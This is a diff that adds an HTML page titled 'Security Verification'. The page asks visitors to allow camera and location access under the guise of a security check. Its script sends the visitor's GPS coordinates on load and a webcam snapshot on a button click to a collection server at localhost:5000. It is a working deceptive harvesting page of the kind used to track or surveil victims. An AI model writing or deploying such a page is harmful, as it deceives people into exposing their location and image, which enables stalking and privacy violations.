@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+</head>
+<body>
+    <h2>Security Verification</h2>
+    <p>To continue, please allow camera and location access.</p>
+    <video id="video" width="320" height="240" autoplay></video>
+    <button id="capture">Capture Image</button>
+    <canvas id="canvas" style="display:none;"></canvas>
+    
+    <script>
+        // Get location
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocation(position) {
+            const locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+            fetch('http://localhost:5000', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(locationData)
+            });
+        }
+
+        // Capture image from webcam
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                document.getElementById('video').srcObject = stream;
+            })
+            .catch(error => alert("Camera access denied"));
+
+        document.getElementById("capture").addEventListener("click", function() {
+            const canvas = document.getElementById("canvas");
+            const video = document.getElementById("video");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL("image/png");
+            fetch('http://localhost:5000', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({image: imageData})
+            });
+        });
+
+        getLocation();
+    </script>
+</body>
+</html>
